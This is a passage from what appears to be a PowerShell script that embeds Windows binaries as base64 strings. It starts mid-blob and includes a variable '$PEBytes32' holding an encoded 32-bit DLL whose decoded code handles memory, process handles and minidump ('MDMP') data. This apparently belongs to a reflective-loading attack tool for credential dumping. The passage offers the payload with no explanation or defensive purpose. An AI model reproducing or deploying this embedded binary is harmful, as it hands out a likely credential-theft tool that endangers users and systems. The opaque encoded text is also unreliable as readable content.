SZMAAIw1AwBMkwAA6JUAABg0AwDolQAApJoAAPwzAwCkmgAA55sAAIQyAwDomwAAnpwAAHgyAwCgnAAAKZ0AAGwyAwAsnQAA+p4AAMgpAwD8ngAAh58AAMgpAwCInwAA4KAAAJQuAwDgoAAAXqEAADQtAwBgoQAAi6EAABAtAwCMoQAAuKUAAHwuAwC4pQAAUKsAAGAuAwBQqwAAi6wAAFAuAwCMrAAAE68AADguAwAUrwAAlrEAACgqAwCYsQAAi7IAAHgsAwCMsgAABbMAAIw0AwAIswAA9LQAAHg1AwD0tAAAcrUAAHA1AwB0tQAAuLUAAHA1AwC4tQAAj7YAADQtAwCQtgAAbrkAAJAwAwBwuQAA/boAAJQrAwAAuwAAibsAABAtAwCMuwAAR70AAFwyAwBIvQAAI74AAMArAwAkvgAAkb4AAHA1AwCsvgAABr8AAMgpAwAIvwAAv8EAAHwwAwDUwQAAscQAAEQyAwC0xAAA88UAACAuAwD0xQAAQscAAAQuAwBExwAAKskAAOgzAwAsyQAA4cwAAGAwAwDkzAAAXs4AAEgwAwBgzgAALNAAACwwAwAs0AAAONQAACgyAwA41AAA5NcAABAwAwDk1wAAsd0AAAgyAwC03QAAMt4AAJw2AwA03gAAHt8AAPQtAwAg3wAAPuEAANwtAwBA4QAAPuIAAPwvAwBA4gAA0eQAAMQtAwDU5AAAO+YAAHgrAwA85gAAuO4AAOw2AwC47gAAhe8AALQtAwCI7wAAEfEAAOgzAwAU8QAAHvMAAIw0AwAg8wAAzvMAAOQvAwDQ8wAAgvQAAOQvAwCE9AAAx/oAAGwrAwDQ+gAABfwAABAtAwAI/AAAS/wAABAtAwBM/AAAfPwAAHA1AwB8/AAArPwAAHA1AwCs/AAA3PwAAHA1AwDc/AAABv0AAHA1AwAI/QAAOv0AABAtAwA8/QAAbv8AAOwxAwBw/wAAYQABANQzAwBkAAEAgQABABAtAwCEAAEAQwEBAGAsAwBEAQEAXQEBABAtAwBgAQEAhgMBAFQ1AwCIAwEALgUBANwvAwAwBQEABwoBADg1AwAICgEAgwsBAGQrAwCMCwEAeg8BANg2AwB8DwEAKBEBAFwrAwAoEQEAoBIBAFQrAwCoEgEAaRcBAMA2AwBsFwEArh0BAMAvAwC0HQEA/h0BAMgpAwAQHgEAlx4BAKwtAwC4HgEA8B8BAJgtAwDwHwEAEiABABAtAwAsIAEAHiEBANQzAwAgIQEAYiEBAGwsAwBkIQEACyIBAMgpAwAMIgEATiIBAGwsAwBQIgEAoiIBAMgpAwCkIgEAQiMBADwpAwBEIwEAayMBAHA1AwBsIwEAkyMBAHA1AwCUIwEAviMBAHA1AwDAIwEA6iMBAHA1AwDsIwEAFiQBAHA1AwAYJAEAQiQBAHA1AwBEJAEAbiQBAHA1AwB4JAEAEiUBAEwrAwAcJQEA8icBAKg2AwD0JwEADigBABAtAwAQKAEAfygBAEQrAwCAKAEAlygBABAtAwCYKAEArygBABAtAwCwKAEA/igBAMgpAwAAKQEAdCkBAJw2AwB0KQEA3ikBAGwsAwDgKQEAFyoBAHA1AwAYKgEA5CoBAGwsAwDkKgEA+yoBABAtAwD8KgEAzisBABAtAwDQKwEA4ysBABAtAwDkKwEA+isBABAtAwD8KwEAQC8BANgxAwBALwEAeC8BABAtAwB4LwEArTABAJAtAwCwMAEAyzIBALAvAwDMMgEA/jIBAHA1AwAAMwEAYTQBABAtAwBkNAEAgTQBABAtAwCENAEAvjkBAMAxAwDAOQEADT4BAJwvAwAQPgEAyD4BAIgtAwDIPgEAVj8BAJQvAwBYPwEALUMBACA1AwAwQwEArEcBALgzAwCsRwEAtUkBAKQxAwC4SQEAyksBABQ1AwDMSwEAE0wBABAtAwAUTAEAV00BAKwzAwBYTQEA900BAJAxAwD4TQEAfE8BABAtAwB8TwEAD1ABABAtAwAQUAEAXlEBADQtAwB0UQEA9FEBADwrAwD0UQEAeVMBAJgzAwB8UwEAV1UBAHgxAwBYVQEA5VUBAGAsAwDoVQEABFYBABAtAwAEVgEAY1YBAGwsAwCUVgEAwlYBAHA1AwDEVgEANVoBAIQzAwA4WgEAqVoBADwpAwCsWgEAWF4BAPw0AwBYXgEA8V4BAIw0AwD0XgEAZV8BAMgwAwBoXwEAjWQBAIA2AwCQZAEA+WkBAGgzAwD8aQEAqmoBAGwsAwCsagEAIGwBAFgzAwAgbAEADG0BAGQxAwAMbQEAkW0BAEwxAwCUbQEAq24BADQxAwCsbgEA2m4BAHA1AwDcbgEA3nABAOA0AwDgcAEA+XABABAtAwD8cAEAPnMBAMw0AwBAcwEAbnMBAHA1AwBwcwEAlXMBAHA1AwCYcwEA0nMBAHg2AwDUcwEAAnQBAHA1AwAEdAEAF3QBABAtAwAYdAEAznQBAMQ0AwDQdAEAqHUBAGA2AwCodQEAkHcBAEQyAwCQdwEAS3wBABgxAwBMfAEAknwBAHA1AwCUfAEAHH4BALA0AwAcfgEAR4ABAEQ2AwBIgAEAl4EBAEQyAwCYgQEADYQBAIw0AwAQhAEA6YQBAEQzAwDshAEAV4UBAMgwAwBYhQEAhoUBAHA1AwCIhQEAvIYBAKA0AwC8hgEA6oYBAHA1AwAEhwEAsocBAIw0AwC0hwEAVIkBAGwvAwBUiQEAoYkBAHA1AwCkiQEABYsBADAzAwAIiwEANosBAHA1AwA4iwEAkYwBAHw0AwCUjAEAwowBAHA1AwDEjAEA5o0BAHA0AwDojQEAFo4BAHA1AwAYjgEAMI8BAGQ0AwCIkAEAKZEBAFgoAwAskQEARJEBAHA1AwBMkQEAr5EBAMgpAwCwkQEAzZEBABAtAwAAkgEAYZIBADQtAwBkkgEAgZIBAGQoAwCEkgEA75IBAJw2AwDwkgEADZMBAGQoAwAQkwEAe5MBAGwoAwB8kwEAF5QBAJw2AwAYlAEAmZQBAJw2AwCclAEA0JQBABAtAwDQlAEAopYBAHQoAwCklgEAkZgBAJQoAwCUmAEA0ZgBADwpAwDUmAEA9ZkBAEwpAwAEmgEAS5oBAMgpAwBMmgEAnZoBAFQpAwCgmgEAH5sBAIw0AwAgmwEA+ZsBAGgpAwD8mwEAA50BAIApAwAEnQEACqcBAJQpAwAMpwEA4KcBALgpAwDgpwEAPKgBAMgpAwA8qAEAjagBAFQpAwCQqAEAFKkBAIw0AwAUqQEA6bMBANApAwDsswEABLUBAPQpAwAEtQEA3LUBAIw0AwDctQEALbYBADwpAwAwtgEAkrgBAAgqAwCUuAEAa7oBACgqAwBsugEAG8sBAEQqAwAcywEAissBADwrAwAYzAEAWcwBAGgqAwBwzAEAI80BAIgqAwAkzQEAc80BAHA1AwB0zQEAy84BACQtAwDMzgEAz9QBAJQqAwDQ1AEA09oBAJQqAwDU2gEA8twBAKgqAwD03AEAm+UBAMQqAwCc5QEANuYBAOgqAwA45gEA0uYBAOgqAwDU5gEAFucBADQtAwAY5wEAwugBAPwqAwDE6AEAFOoBABArAwAU6gEApesBACArAwCs6wEAEO0BACQtAwAu7QEAge0BAIwoAwCO7QEA4e0BAIwoAwDu7QEAQe4BAIwoAwBO7gEAqu4BAIwoAwCu7gEAAe8BAIwoAwAO7wEAYe8BAIwoAwBu7wEAwe8BAIwoAwDO7wEAKvABAIwoAwAu8AEAR/ABAIwoAwBH8AEAaPABAIwoAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAnAAAAPinUKhYqLCpuKnAqdCp4KnoqfCp+KmorPisAK0IrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcCtyK3Qrdit4K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCuiK6QrpiuoK6orrCuuK7Yr+Cv6K/wr/ivAAAAEAIA4AIAAACgCKAQoBigIKAooDCgOKBAoEigYKCIoJCgmKCgoKigsKC4oMCg2KDgoOigAKEgoUChYKFooYChiKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAogiiIKI4okCiWKJwoniigKKIopCimKKgoqiisKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo2ijcKN4o4CjiKOQo5ijoKOoo7CjuKPAo8ij0KPgo/ijAKQYpDCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKW4pdCl2KXgpeil8KUIpiCmKKYwpjimQKZIplCmWKZgpmimcKaIpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcwpzinSKdQp2CnaKd4p4CnmKegp6insKe4p8CnyKfQp9in4Kfop/Cn+KcAqAioEKgYqDCo4KjwqPioAKkQqRipMKk4qVCpWKlwqXipgKmQqZipoKmwqbipwKnQqdip8Kn4qRCqGKowqjiqUKpYqnCqeKqQqpiqsKq4qsCq0KrYquCq8Kr4qhCrGKswqzirQKtIq1CrWKtgq2ircKt4q5CrsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrGCsaKxwrICskKygrLCswKzQrOCs8KwArQitEK0YrSCtKK0wrTitQK1IrVCtWK1grWitcK14rYCtiK2QrZitoK2orbCtuK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K4ArwivEK8YryCvKK8wrzivQK9Ir1CvWK9gr2ivcK94r4ivkK+Yr6CvqK+wr7ivwK/Ir9Cv2K/gr+iv8K/4rwAAACACACgAAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoHCgeKCAoABgAwCcAAAAEKAYoCigIKMoozijgKPQoyCkYKRopHikwKQApQilGKWApdClIKZgpmimeKawprimyKYQp1CnWKdop5inoKeop8CnEKhgqLCoAKlAqVip0KkgqnCqwKoQq2CroKu4q/Cr+KsIrGCssKwArVCtoK3wrTCuOK5ArkiuUK5YrmCuaK5wrniugK6IrpCumK7grjCvgK/QrwBwAwDEAAAAIKBgoGig4KDwoDChQKGAoZCh0KHgoSCiMKLAotCiEKMgo2CjcKOwo8Cj8KP4owCkCKQQpBikIKRwpMCkEKVwpYClsKW4pcClyKXQpdil4KXopTinSKeIp5in2KfopyioOKh4qIioyKjYqBipKKloqXipuKnIqQiqGKpYqmiqqKq4qviqCKtIq1irmKuoq+ir+Ks4rEisiKyYrNis6KworTiteK2Ircit2K0YriiuaK54rgCvUK+gr+CvAAAAgAMAoAAAABCgGKAgoCigMKA4oFCgYKCgoLCg8KAAoTChOKFAoUihUKFYoWChaKFwoeCh8KEwokCigKKQotCi4KJAo1CjkKOgo+CjMKSApAClEKVQpWCloKWwpfClAKY4pnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnEKcYpyCnKKcwpzinQKdIp1CnWKdgp2inAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $PEBytes32 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA8J1R3eEY6JHhGOiR4RjokcT6vJH1GOiRxPr4kdUY6JHE+qSR6RjokcT65JERGOiQeqPEkekY6JOOt8SR6Rjoku0lnJGtGOiR4Rjskekc6JF+ARCR5RjokcT6zJEpGOiRxPqgkeUY6JHE+qyR5RjokUmljaHhGOiQAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBAAb3eJUAAAAAAAAAADgAAIhCwEJAAByAQAAXgEAAAAAAIszAQAAEAAAAJABAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAAAAAAAAAMAAAQAAAAAAAADAEABAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAoLECAF8AAAAUmwIABAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAgB4GgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJABANwDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAORwAQAAEAAAAHIBAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAD/IQEAAJABAAAiAQAAdgEAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAvBwAAADAAgAAGgAAAJgCAAAAAAAAAAAAAAAAAEAAAMAucmVsb2MAAHAdAAAA4AIAAB4AAACyAgAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIpIAYTJeQ9mi0ACiuiKzA+3wYPABMMPtsFAQMNVi+xRUYN9CAAPhBMBAACLF1NWi8Loyv///4vYi0UI6MD///+KUgGJRfyE0nlIA8NQakD/FQySARCL8IX2D4TdAAAAU/83VujEJAEA/3X8A97/dQhT6LYkAQBmi0YCiuiDxBiKzGYDTfyK4YrFZolGAumZAAAAD7bKA8iJTfiD+X92W4PBBFFqQP8VDJIBEIvwhfYPhIcAAACLBw+2SAFRg8ACUI1GBFDoYyQBAIsH/3X8D7ZAAf91CI1EMARQ6E0kAQCLB4oAiAZmi0X4iuiDxBjGRgGCisxmiU4C6zEDw1BqQP8VDJIBEIvwhfZ0MVP/N1boGCQBAP91/APe/3UIU+gKJAEAikX8g8QYAEYB/3UIix0QkgEQ/9P/N//TiTdeW8nDVYvsUQygUw+2wGoAUDPbM8DoJgAAAFlZiUX8W4XAdBpX/3UMjX386LD+////dfyLfQjopf7//1lZX8nDVleL+IP7f3YwjUMEUGpA/xUMkgEQi/CF9nRLikQkDIgGZovDiujGRgGCisxmiU4Chf90Mo1GBOsijUMCUGpA/xUMkgEQi/CF9nQbikQkDIgGiF4Bhf90Do1GAlNXUOhNIwEAg8QMi3wkEIX/dAlW6Cz+//9ZM/Zfi8Zew1WL7IPsII1F8FD/dQj/FQiSARCFwHRKD7dF/FAPt0X6UA+3RfhQD7dF9lAPt0XyUA+3RfBQaJSUARCNReBqEFDoRhgBAIPEJIXAfhVTagBqGGoPW41F4Ogo////WVlbycMzwMnDVYvsUVFWagH/dQiNRfhQM/boaxYBAIXAfB6LRfxTD7dd+FZqG+j1/v//WYvwWY1F+FDoUBYBAFuLxl7Jw1WL7FFRU1czwFBqA8ZF+ACNffmrD8lqBVuNRfiJTfnovv7//1lZX1vJw1VWV4s9AJIBEDPtVVX/14vwjQQ2UGpA/xUMkgEQiQOFwHQahfZ2DFBW/9dOO8Z1A0XrCv8zM+3/FRCSARBfXovFXcNVi+xRVmgEAQAAakAz9v8VDJIBEP91CIkH/xVwkgEQhcB0L1ONXfzokf///1uFwHQy/3UI/3X8/zf/FXSSARD/dfyL8PfeG/b33v8VEJIBEOsN/3UI/zf/FWySARCL8IX2dQj/N/8VEJIBEIvGXsnDVYvsUVFTVlcz/4l9+Il9/Dk9NNsCEA+EjAAAAIs18JABEI1F/FBXagH/dRD/dQz/1oXAD4S7AAAAi0X8A8BQakD/FQySARCL2DvfD4SjAAAAjUX8UFNqAf91EP91DP/WiUX4O8d0OP91CGi4lAEQ6P8OAABZM/ZZOX38dhcPtwRzUGg4lQEQ6OcOAABGWVk7dfxy6WhAlQEQ6NUOAABZU/8VEJIBEOtMV1dqAldXaAAAAED/dQj/FRySARCL8Dv3dDKD/v90LVeLfRCNRfxQV/91DFb/FRSSARCFwHQPO338dQpW/xUgkgEQiUX4Vv8V/JEBEItF+F9eW8nDVYvsg+wUVzP/V1dqA1dqAWgAAACA/3UIiX38/xUckgEQiUX4O8d0ZoP4/3RhjU3sUVD/FQSSARCFwHRJOX3wdUSLRexQakCJBv8VDJIBEIkDO8d0MFeNTfRR/zZQ/3X4/xUYkgEQhcB0EIsGO0X0dQnHRfwBAAAA6wv/M4l9/P8VEJIBEP91+P8V/JEBEItF/F/JwzPSZjkRdCtWi8FXM/ZmizhmO768ogEQdQZqfl9miThGRoP+EnLnQo0EUWaDOAB1219ew1WL7IPsJFZXiUXsaESuARCNRfAz/1DHReAKAAAAiX3kx0XoUUgAEOiEEwEAjUXwahCNdfyJRdyJffzoVxEAADvHWYlF+Hwpi3X8OT52G1ONXgSNRdxQU+gbAAAAhcB0CEeDwxA7PnLqW1b/FRCSARCLRfhfXsnDVYvsg+wMU1eLfQj/NzPbU2pAx0X0AQAAAP8V9JEBEIlF+DvDD4ShAAAAVot1DP92CI1FCGoB/3YEUP8V+JEBEFAPt0cGUP91+P8V7JEBEIXAdG6NRfxQU1NqAv91COjiEgEAPQQAAMB1Tv91/GpA/xUMkgEQi9iF23Q9jUX8UP91/FNqAv91COi4EgEAhcB8IIsGhcB0DWoBUFPonxIBAITAdA3/dhBX/3UI/1YMiUX0U/8VEJIBEP91CP8V/JEBEP91+P8V/JEBEF6LRfRfW8nCCABVi+xRVzP/OX0cdTQ793QEiw7rAjPJi0UYO8d0BIsA6wIzwFeNVfxSUVD/dRT/dRD/dQz/dQj/FeiRARCL+OtixwYAAAEAU/82akD/FQySARCLTRgz24kBO8N0RVONTfxR/zZQ/3UU/3UQ/3UM/3UI/xXokQEQi/g7+3Ub/xXwkQEQi9iB++oAAAB1C4tFGP8w/xUQkgEQ0SaB++oAAAB0pluF/3Up/xXwkQEQUP91DGjQogEQ6KsLAACDxAw5fRx0FotFGP8w/xUQkgEQ6wmF9nQFi0X8iQaLx1/Jw1WL7FZXM/ZWVmoDVlZoAAAAwGjEowEQ/xUckgEQi/g7/nQqg///dCWLdRhqAf91FP91EP91DP91CFfo5P7//4PEGFeL8P8V/JEBEOsT/xXwkQEQUGhgowEQ6CoLAABZWV+Lxl5dw1WL7IPsDFaNRfhQjUX8UP91EDP2/3UMiXX8/3UI6Hj///+DxBSJRfQ7xnQrU4td/FeLffjR73QWD7cEc1BoOJUBEOjbCgAARllZO/dy6lP/FRCSARBfW4tF9F7Jw1WL7IPsHFZXagZZM8CNfeTzq41F/FBqAY1F5FAz9lbovQ8BAIXAfB7/dQhqDP91/OimDwEA/3X8M8mFwA+dwYvx6KEPAQBfi8ZeycNVi+xRVos1DJABEFeNRfxQM/9X/3UMiX38/3UI/9b/FfCRARCD+Fd0BYP4enUu/3X8akD/FQySARCJA4XAdB2NTfxRUP91DP91CP/Wi/iF/3UK/zP/FRCSARCJA4vHX17Jw1WL7FGDZfwAVos1DJIBEGoIakD/1okHhcB0cYtNCIkIg+kAdFJJdAtJdCpJdAWD6QN1UWoEakD/1osPiUEEiweLQASFwHQ9i00MiQjHRfwBAAAA6zdqBGpA/9aLD4lBBIsHi3AEhfZ0G/91DOiGBQAAWYlF/OsHx0X8AQAAAIN9/AB1CP83/xUQkgEQi0X8XsnDhfZ0NosGSFeLPRCSARB0IEh0Ckh0GoPoA3Ua6xOLRgSFwHQMiwDooQUAAP92BP/X/3YE/9dW/9dfwzPAw1WL7IPk+IPsHFMz21aLdQiNRCQciUQkGItGBIlcJByJXCQgiVwkFIsIK8tXiVwkEA+ErgAAAEkPhIQAAABJSXRVg+kDD4WVAQAAi30Mi08EORkPhUABAACLDjvLdBaLQARTU1H/MP8V5JEBEIXAD4RrAQAAU41EJBhQ/3UQi0YE/zeLQAT/MP8VFJIBEIlEJBDpSQEAAIt9DItPBDkZD4X0AAAAU1b/dRAz9v83aIfBIgCLQAT/MOgn/P//g8QY68yLfQyLTwQ5GQ+FyQAAAItABFP/dRD/N/82/zD/FbyRARDrqYt9DItHBIsIK8sPhIsAAABJdHBJdFRJdD+D6QMPhdkAAACLQARTU/83/zD/FeSRARCD+P8PhMEAAABTjUQkGFD/dRCLRwT/NotABP8w/xUYkgEQ6VH///9TVlP/N411EGiDwSIA6WT/////dRCLQAT/N4sA/zbojQQAAIPEDOkm////i0AEU/91EP82/zf/MP8V0JEBEOkO/////3UQ/zf/Nuj/GQEAg8QMx0QkEAEAAADrR/91EGpA/xUMkgEQiUQkGDvDdDT/dRCNRCQcV1DoR/7//4PEDIXAdBX/dRCNRCQcUFboMv7//4PEDIlEJBD/dCQY/xUQkgEQi0QkEF9eW4vlXcNVi+yD7CRTVo1F8FeLfRCLH4lF5ItHCDP2jQwDiU34i00Ii0kEiXXwiXX0iXXgiUXoiXXsiXX8OTF1G4tPBIsRK9YPhLYAAABKdFpKdB5KdFSD6gN0T4tdCItF/IvI99kbySPLiU8MX15bycNQi0EEiwBT6IsFAABZWYlF4DvGdNVWjUXgUP91DP91COhv////g8QQiUX8O8Z0u4sfK13gA13s67RQakD/FQySARCJReA7xnSh/3cIjUXgV1DoVP3//4PEDIXAdCRWjUXgUP91DP91COgn////g8QQiUX8O8Z0CosfK13gA13s6wOLXQj/deD/FRCSARDpW////4tFDAPDO0X4dx2LVQiLMotNDDPSi/vzpot9EA+UwkNAiVX8hdJ03kvpLv///1WL7FFRi0cEUzPbiR+LCCvLiX38x0X4BAAAAHRCSXQmSUl1T4tABFZTjU38Uf91CI11+FNoi8EiAP8w6I75//+DxBhe6y3/dQyLQARoABAAAP91CFP/MP8VxJEBEOsS/3UMaAAQAAD/dQhT/xXMkQEQiQczwDkfWw+VwMnDi0EEixBXM/8r13Q5SnQhSkp1QotABFZXV1f/MTP2aI/BIgD/MOgn+f//g8QYXusli0AEaACAAABX/zH/MP8V1JEBEOsOaACAAABX/zH/FdyRARCL+IvHX8NVi+xRi0cEiwhWM/Yrzg+EwQAAAEkPhKgAAABJD4XIAAAAi0AEixBqEOiZAQAAWTPJO8EPhLEAAACJTfw5SAwPgqUAAAB3CTlICA+GmgAAAIX2D4WSAAAAixczyYsJO9FyXYs1GAAAAAPxO9Z3UYsVCAAAAIkLiw0kAAAAiUsUiw0YAAAAiUsMiw0gAAAAiVMEixUQAAAAiUsQiw0oAAAAM/ZGiVMIiUsY/0X8M8k7SAxynXc1i038O0gIcpPrKzP26+aLQARqHFP/N/8w/xXYkQEQ6wtqHFP/N/8V4JEBEIvwg+4c994b9kaLxl7Jw1WL7FGLSgRWizEzwCvwdBxOdTiNRfxQ/3UMi0EE/3UI/zL/MP8VyJEBEOsSjUX8UP91DP91CP8y/xXAkQEQhcB0CYX/dAWLTfyJD17Jw1dqCGpAM///FQySARCJBjvHdFBXV1dqAlf/dCQc/xWwkQEQiw6JAYsGOTh0MVdXV2oE/zD/FbiRARCLDolBBIsGi0gEO890FoE5TURNUHUOupOnAABmOVEEdQNH6wXoBAAAAIvHX8NWi/CLRgSFwHQHUP8VtJEBEIs2hfZ0B1b/FfyRARAzwEBew4tKBItBDItSBFNWi3IIA8EzyVeF9nYSi/iLHztcJBB0DkGDxww7znLwM8BfXlvDa8kMi0QBCAPC6/FVi+yD7HhTVleL8DP/agmL1ol92Il93Oiq////WYvIiU34O88PhNABAACLQQgDRgSJfeiJRfyJfew5eQQPgqYBAAB3CDk5D4acAQAAi0UMmYlF8IlV9Il9rIt16EbB5gQD8YtOBIseiV3gOU30cjJ3BTld8HIri34Ii0YMi9cD04lVoIvQE9GJfbg5VfQPgpIAAAB3DItV8DtVoA+ChAAAAItVEANV8ItFrBNF9IlVwIlFxDvBcit3BTtV4HIki34Ii0YMi9cDVeCJfbiJVZiL0BPROVXEck13CItVmDlVwHJDOU30D4fRAAAAcgyLRfA7ReAPg8MAAACLfgiLRgyL1wNV4Il9uIlVkIvQE9E5VcQPgqUAAAB3DItVkDlVwA+GlwAAADlN9HcjcgiLVfA7VeBzGYt94DPSK33wiVW0G030iX3Qi324iU3U6xaLVfArVeCLXfQb2YNl0ACDZdQAiV20i00QK03QagBbiU3IiV2sG13UA8qJTYiLyxNNtIldzDvIchJ3BTl9iHYLK/obRbSJfciJRcyLRfyLfciLTdAD0ItFCFdSA8hR6O4TAQCLRcyDxAwBfdgRRdyDRegBi0YIi034agBfEX3sAUX8i0XsO0EED4J+/v//dwuLReg7AQ+Ccf7//4tN2DPAO00QdQg5Rdx1AzP/R4vHX15bycNVi+yD7ExTM9tWi/BXagmL1old/Ild2Ild3Ild0Ild1Ild6Ild7Oia/f//i/hZiX34O/sPhBYBAACLXwgDXgSLBzPJiU3giU3kOU8ED4L9AAAAdwg7wQ+G8wAAAItFCJmJRfCJVfSLTeBBweEEA8+LcQSLETl19HJPdwU5VfBySItBCAPCiUW4i0EME8Y5RfR3NnIIi0XwO0W4cyyLeQyLxotxCIl10Ct18Il91Bt99APyE/iJfeyLffiJXfyJVdiJRdyJdejrU4vGOUX0d0xyBTlV8HNFg338AHRzi3XQA3XYiXXIi3XUE3XciXXMi3XIiXXAi3XMiXXEO1XAdVA7xnVMiUXci0EIAUXoiVXYi1EMEVXsiUXQiVXUM8A5Rex3NHIIi1XoO1UMcyqDReABEUXki0XkA1kIO0cED4Ik////dwuLReA7Bw+CF////zPAX15bycOLRfzr9lWL7IM9PNsCEAAPhIcAAACNRQxQ/3UI/xV8kwEQWVmFwH50iw1A2wIQi9ErFUTbAhBWSjvCdjSNNAGNdDYCagKNBDZQ/zU82wIQ/xWskQEQozzbAhCFwHQKi86JDUDbAhDrDYsNQNsCEOsFoTzbAhCNVQxSixVE2wIQ/3UIK8pRjQRQUOgsBwEAg8QQXoXAfgYBBUTbAhChONsCEIXAdBGNTQxR/3UIUP8VGJMBEIPEDP81ONsCEP8VHJMBEFldw1Yz9oX/dBRo3KMBEFf/FSCTARCL8FlZhfZ0G6E42wIQhcB0CFD/FSyTARBZiTU42wIQhf90DYM9ONsCEAB1BDPAXsMzwEBew1WL7IPsPFNWV4v4i0cEM/ZqAVf/dQwz2zl1HP91CIlF9I1F4Il1+A+Uw4l14Il15Il18Il16IlF7Il1/OhZ9///g8QQhcAPhPYAAACLRwwDRRiJRfA73nUx/3UUakD/FQySARCJReg7xg+E0wAAAP91FI1F8FCNRehQ6DH1//+DxAw7xg+EuAAAAI1dxI198OgG+f//hcAPhJcAAACLRdiLTdglAP///4PhD3QJg/kEcwRqBOsSi03YgeHwAAAAdB+D+UBzGmpAWQvBUP91FI19/I1V8Oiw+f//WVk7xnRU/3UUjUXw/3UQUOjB9P//g8QMiUX4O8Z0JDl1HHQf/3Uk/3Ug/1Uc/3UUjUXoUI1F8FDomfT//4PEFIlF+Dl1/HQS/3X8M///dRSNVfDoWPn//1lZOXXodAn/dej/FRCSARCLRfhfXlvJwzPAM9I5RCQEdhZWizE7dCQMdwyLwUKDwTw7VCQIcuxew1WL7I